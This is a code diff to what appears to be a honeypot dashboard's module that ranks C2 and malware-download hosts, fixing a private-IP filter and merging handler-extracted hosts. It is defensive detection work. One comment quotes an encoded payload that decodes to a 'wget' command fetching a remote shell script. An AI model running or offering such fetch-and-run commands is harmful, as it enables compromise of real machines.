@@ -280,7 +280,13 @@ def _is_plausible_c2_host(host: str) -> bool:
     if not host or host.lower() in _C2_IGNORE_HOSTS:
         return False
     # Drop private / loopback / link-local / reserved IP ranges.
-    if re.fullmatch(r'(10|127|172\.(1[6-9]|2\d|3[01])|192\.168|169\.254)\.\d{1,3}\.\d{1,3}', host):
+    if re.fullmatch(
+        r'(10|127)\.\d{1,3}\.\d{1,3}\.\d{1,3}'
+        r'|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}'
+        r'|192\.168\.\d{1,3}\.\d{1,3}'
+        r'|169\.254\.\d{1,3}\.\d{1,3}',
+        host,
+    ):
         return False
     if host.lower().endswith(('.local', '.internal', '.example', '.invalid', '.test')):
         return False
@@ -288,20 +294,30 @@ def _is_plausible_c2_host(host: str) -> bool:
 
 
 def _extract_c2_hosts(store: Any, since: str | None, top_n: int = _C2_TOP_N) -> list[dict]:
-    """Rank C2 / malware-download hosts found inside ``request_raw`` payloads.
+    """Rank C2 / malware-download hosts across two sources (issue #520).
 
-    Only hosts seen in a *download* context (a fetch tool or command
-    substitution immediately before the URL) are counted — this filters out the
-    benign URLs that otherwise flood the panel (the honeypot's own links,
-    reflected attacker URLs, `Host:`/`Referer` headers, etc.). Hosts in
-    private/reserved space or on the ignore list are dropped too.
+    Two complementary surfaces feed the panel:
+
+    1. ``request_raw`` text — hosts seen in a *download* context (a fetch tool
+       or command substitution immediately before the URL). Filters out the
+       benign URLs that otherwise flood the panel (the honeypot's own links,
+       reflected attacker URLs, `Host:`/`Referer` headers, etc.).
+    2. Handler-extracted ``c2_host`` values persisted in ``bot_profile_data``
+       (via :meth:`StorageBackend.fetch_profile_c2_hosts`). A handler may have
+       structurally extracted the C2 drop host from a probe whose raw request
+       line didn't carry a fetch-tool prefix (or was truncated). Those hosts
+       ride on the report's ``request_history`` list and are merged here, so
+       they surface even when the raw-text scan alone would miss them.
+
+    In both cases hosts in private/reserved space or on the ignore list are
+    dropped before counting.
     """
+    counts: Counter[str] = Counter()
     try:
         rows = store.fetch_request_raws(since=since, limit=_C2_RAW_SCAN_LIMIT)
     except Exception:  # noqa: BLE001 — never let the IoC scan break the dashboard
-        logger.exception('C2 host extraction failed')
-        return []
-    counts: Counter[str] = Counter()
+        logger.exception('C2 host request_raw extraction failed')
+        rows = []
     for raw in rows:
         # Issue #368: decode URL/base64 first so IOCs hidden inside encoded
         # payloads (e.g. `%ADd+...%3dphp://input` -> `wget https://1.2.3.4/sh`)
@@ -311,6 +327,18 @@ def _extract_c2_hosts(store: Any, since: str | None, top_n: int = _C2_TOP_N) -> 
             host = m.group(1)
             if _is_plausible_c2_host(host):
                 counts[host] += 1
+    # Issue #520: merge the handler-extracted C2 hosts that never reach a
+    # fetch-tool-prefixed raw line (e.g. truncated payloads, or drop hosts the
+    # Exploit-CGI handler pulled out of a /tmUnblock.cgi probe). Error-safe so
+    # a backend without this method can't break the IoC panel.
+    try:
+        handler_hosts = store.fetch_profile_c2_hosts(since=since, limit=_C2_RAW_SCAN_LIMIT)
+    except Exception:  # noqa: BLE001 — never let the IoC scan break the dashboard
+        logger.exception('C2 host profile-data extraction failed')
+        handler_hosts = []
+    for host in handler_hosts:
+        if _is_plausible_c2_host(host):
+            counts[host] += 1
     return [{'host': h, 'count': c} for h, c in counts.most_common(top_n)]
 
 
